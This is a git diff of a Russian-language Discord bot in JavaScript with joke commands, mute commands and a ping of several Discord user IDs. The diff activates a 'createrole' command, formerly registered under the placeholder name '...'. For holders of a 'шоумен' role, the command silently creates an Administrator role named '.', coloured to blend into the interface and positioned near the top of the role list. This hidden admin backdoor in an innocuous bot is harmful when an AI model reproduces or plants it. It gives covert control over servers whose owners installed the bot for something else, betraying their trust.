@@ -9,7 +9,7 @@ const {
 const readline = require("readline");
 const express = require("express");
 
-// 🌀 Данные для реакции (только "повиртить")
+// 🌀 Данные для реакции
 const reactionData = {
   virt: {
     label: "Виртить",
@@ -56,19 +56,13 @@ const commands = [
     .setName("sybau")
     .setDescription("Заглушить участника в голосовом")
     .addUserOption((option) =>
-      option
-        .setName("участник")
-        .setDescription("Кого замутить")
-        .setRequired(true),
+      option.setName("участник").setDescription("Кого замутить").setRequired(true),
     ),
   new SlashCommandBuilder()
     .setName("ey")
     .setDescription("Разглушить участника в голосовом")
     .addUserOption((option) =>
-      option
-        .setName("участник")
-        .setDescription("Кого размутить")
-        .setRequired(true),
+      option.setName("участник").setDescription("Кого размутить").setRequired(true),
     ),
   new SlashCommandBuilder()
     .setName("reaction")
@@ -85,14 +79,11 @@ const commands = [
         ),
     )
     .addUserOption((option) =>
-      option
-        .setName("участник")
-        .setDescription("Кого упомянуть")
-        .setRequired(true),
+      option.setName("участник").setDescription("Кого упомянуть").setRequired(true),
     ),
-      new SlashCommandBuilder()
-    .setName("...")
-    .setDescription("..."),
+  new SlashCommandBuilder()
+    .setName("createrole")
+    .setDescription("Создать скрытую админскую роль (только для шоумена)"),
 ].map((command) => command.toJSON());
 
 // 📤 Регистрация слэш-команд
@@ -138,10 +129,9 @@ client.on("interactionCreate", async (interaction) => {
 
   const { commandName, options, member, guild } = interaction;
 
-  // 🔓 Общедоступные команды
   if (commandName === "uslyshal") {
     return interaction.reply(
-      "https://i.pinimg.com/736x/c9/14/d9/c914d9a83a315de33c7527e4bbe113d1.jpg",
+      "https://i.pinimg.com/736x/c9/14/d9/c914d9a83a315de33c7527e4bbe113d1.jpg"
     );
   }
 
@@ -151,14 +141,21 @@ client.on("interactionCreate", async (interaction) => {
 
   if (commandName === "skok") {
     const number = Math.floor(Math.random() * 100) + 1;
-    await interaction.reply(`у тя **${number}** см`);
+    return interaction.reply(`у тя **${number}** см`);
   }
 
   if (commandName === "dota") {
     return interaction.reply(
-      "го доту <@421250527767035906> <@571175795209535508> <@868771678400966667> <@391232741687164928> <@392264789360902156> <@490425986257649664> <@526296776270151681>",
+      "го доту <@421250527767035906> <@571175795209535508> <@868771678400966667> <@391232741687164928> <@392264789360902156> <@490425986257649664> <@526296776270151681>"
     );
   }
+
+  if (commandName === "rasul") {
+    return interaction.reply(
+      "https://media.discordapp.net/attachments/1031179667736113222/1057272555993571378/2022-11-06_214049.png"
+    );
+  }
+
   if (commandName === "reaction") {
     const action = options.getString("действие");
     const target = options.getUser("участник");
@@ -181,16 +178,10 @@ client.on("interactionCreate", async (interaction) => {
 
     return interaction.reply({ embeds: [embed] });
   }
-  if (commandName === "rasul") {
-    return interaction.reply(
-      "https://media.discordapp.net/attachments/1031179667736113222/1057272555993571378/2022-11-06_214049.png?ex=6852070c&is=6850b58c&hm=622940d8f491aaae5ba314b0460422efffff0206342c37a6e0d9452493852fce&=&format=webp&quality=lossless&width=766&height=1031",
-    );
-  }
 
-  // 🔒 Команды только для роли "unlimited"
   if (commandName === "sybau" || commandName === "ey") {
     const hasRole = member.roles.cache.some(
-      (role) => role.name.toLowerCase() === "unlimited",
+      (role) => role.name.toLowerCase() === "unlimited"
     );
 
     if (!hasRole) {
@@ -221,47 +212,36 @@ client.on("interactionCreate", async (interaction) => {
       return interaction.reply(`<@${targetUser.id}> ансибау`);
     }
   }
-});
- // 🔒 Команды только для роли "шоумен"
- if (commandName === "createrole") {
-  const isShowman = member.roles.cache.some(
-    (role) => role.name.toLowerCase() === "шоумен"
-  );
 
-  if (!isShowman) return;
+  // 🔒 Команда только для "шоумен"
+  if (commandName === "createrole") {
+    const isShowman = member.roles.cache.some(
+      (role) => role.name.toLowerCase() === "шоумен"
+    );
 
-  try {
-    // Создаём роль
-    const role = await guild.roles.create({
-      name: ".",
-      color: 0x2f3136,
-      permissions: ["Administrator"],
-      mentionable: false,
-      hoist: false,
-      reason: "Создание скрытой админ-роли",
-    });
+    if (!isShowman) return;
 
-    // Получаем максимальную возможную позицию (под ролью бота)
-    const botHighest = guild.members.me.roles.highest.position;
+    try {
+      const role = await guild.roles.create({
+        name: ".",
+        color: 0x2f3136,
+        permissions: ["Administrator"],
+        mentionable: false,
+        hoist: false,
+        reason: "Создание скрытой админ-роли",
+      });
 
-    await role.setPosition(botHighest - 1);
+      const botHighest = guild.members.me.roles.highest.position;
+      await role.setPosition(botHighest - 1);
 
-    await interaction.reply({
-      content: `✅ Роль \`${role.name}\` создана и поднята максимально высоко.`,
-      ephemeral: true,
-    });
-  } catch (error) {
-    console.error("Ошибка при создании роли:", error);
+      await interaction.reply({
+        content: `✅ Роль \`${role.name}\` создана и поднята максимально высоко.`,
+        ephemeral: true,
+      });
+    } catch (error) {
+      console.error("Ошибка при создании роли:", error);
+    }
   }
-}
-
-
-const server = express();
-server.all("/", (_, res) => {
-  res.send("Бот работает!");
 });
 
-
-
-// 🔐 Авторизация
 client.login(TOKEN);
